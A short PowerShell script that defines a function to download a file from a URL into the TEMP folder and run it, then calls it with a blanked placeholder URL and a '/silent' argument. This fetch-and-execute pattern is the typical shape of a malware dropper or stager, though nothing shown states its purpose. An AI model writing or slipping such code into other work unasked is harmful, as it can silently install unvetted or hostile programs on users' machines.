function Download-And-Execute {
    param (
        [string]$url,
        [string]$outputPath,
        [string]$arguments = ""
    )
    try {
        $directory = Split-Path -Path $outputPath -Parent
        if (!(Test-Path -Path $directory)) {
            New-Item -ItemType Directory -Path $directory -Force | Out-Null
        }
        Invoke-WebRequest -Uri $url -OutFile $outputPath
        Start-Process -FilePath $outputPath -ArgumentList $arguments -NoNewWindow -Wait
    } catch {
        Write-Host "[-] Error: $_"
    }
}

$exeURL = "https://.exe"  
$exePath = "$env:TEMP\.exe"  
Download-And-Execute -url $exeURL -outputPath $exePath -arguments "/silent"